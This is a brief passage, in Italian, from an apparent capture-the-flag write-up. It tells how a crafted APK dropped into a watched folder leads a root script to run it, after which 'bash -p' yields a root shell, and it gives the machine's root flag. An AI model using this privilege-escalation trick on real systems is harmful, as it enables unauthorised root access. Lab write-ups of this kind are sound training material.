Ho caricato l'apk appena creata sulla macchina host nella cartella */opt/mdm/apk_bin/* e ho aspettato che venisse eseguito lo script:

```shell
will@catch:~$ bash -p
bash-5.0#
```

In */root* abbiamo la root flag: `f38663a37897e63b82406ab241241da4`